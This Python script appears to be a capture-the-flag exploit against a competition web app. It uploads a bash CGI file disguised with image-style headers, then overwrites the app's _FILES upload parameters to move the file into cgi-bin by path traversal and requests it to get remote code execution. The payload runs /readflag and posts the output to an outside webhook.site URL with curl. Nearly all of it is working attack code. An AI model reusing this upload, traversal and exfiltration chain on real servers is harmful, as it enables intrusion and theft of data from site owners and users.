import requests 
import re 

url = "http://apb2023.cstec.kr"
# url = "http://localhost:7777" 

cmd = b'curl -X POST --data "$(/readflag)" https://webhook.site/bfb55427-6b02-4225-b682-75fc20e8ae6e'
            
payload = b'#!/bin/bash\n\n#define width 1337\n#define height 1337\n\n\necho "Content-type: text/html"\necho ""\n'+ cmd + b'\n\nexit 0\r\n'
def upload_cgi(): 
    data = b''
    data += b'------WebKitFormBoundaryfiHGniD3Q8Bf1zG4\r\n'
    data += b'Content-Disposition: form-data; name="title"\r\n\r\n'
    data += b'test\r\n'
    data += b'------WebKitFormBoundaryfiHGniD3Q8Bf1zG4\r\n'
    data += b'Content-Disposition: form-data; name="attachment[]"; filename="a.test"\r\n\r\n'
    data += payload
    data += b'------WebKitFormBoundaryfiHGniD3Q8Bf1zG4\r\n'
    data += b'Content-Disposition: form-data; name="content"\r\n\r\n'
    data += b'asdfasdfasdfasdfasdf\r\n'
    data += b'------WebKitFormBoundaryfiHGniD3Q8Bf1zG4\r\n'
    data += b'Content-Disposition: form-data; name="password"\r\n\r\n'
    data += b'youcantguestit!\r\n'
    data += b'------WebKitFormBoundaryfiHGniD3Q8Bf1zG4--\r\n'
    
    return requests.post(
        f"{url}/?page=proc_more",
        headers={"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfiHGniD3Q8Bf1zG4"},
        data=data 
    ).text

def exploit(uuid): 
    data = b''
    data += b'------WebKitFormBoundaryfiHGniD3Q8Bf1zG4\r\n'
    data += b'Content-Disposition: form-data; name="title"\r\n\r\n'
    data += b'test2\r\n'
    data += b'------WebKitFormBoundaryfiHGniD3Q8Bf1zG4\r\n'
    data += b'Content-Disposition: form-data; name="content"\r\n\r\n'
    data += b'asdfasdfasdfasdfasdf\r\n'
    data += b'------WebKitFormBoundaryfiHGniD3Q8Bf1zG4\r\n'
    data += b'Content-Disposition: form-data; name="password"\r\n\r\n'
    data += b'youcantguestit!\r\n'
    data += b'------WebKitFormBoundaryfiHGniD3Q8Bf1zG4--\r\n'

    return requests.post(
        f"{url}/?page=proc_more&_FILES[attachment][tmp_name][0][0]=a&_FILES[attachment][tmp_name][1]=/var/www/html/uploads/a_{uuid}_0.test&&_FILES[attachment][name][0]=/var/www/html/uploads/a_{uuid}_0.test&_FILES[attachment][name][1]=../../cgi-bin/.cgi",
        headers={"Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfiHGniD3Q8Bf1zG4"},
        data=data 
    ).text

def get_id(text):
    return int(re.search("id = '(\d+)';", text).group(1))

def get_uuid(id):
    r_text = requests.get(f"{url}/?page=show&type=support&id={str(id)}&pass=youcantguestit!").text
    return re.search("\/download.php\?attachment=(.*)\">", r_text).group(1)

def rce(uuid):
    requests.get(f"{url}//cgi-bin/_{uuid}_1.cgi")
    
r_text = upload_cgi()
id = get_id(r_text)
uuid = get_uuid(id) 

r_text = exploit(uuid) 
id = get_id(r_text) 
uuid = get_uuid(id) 

rce(uuid) 
print("Successs!!")
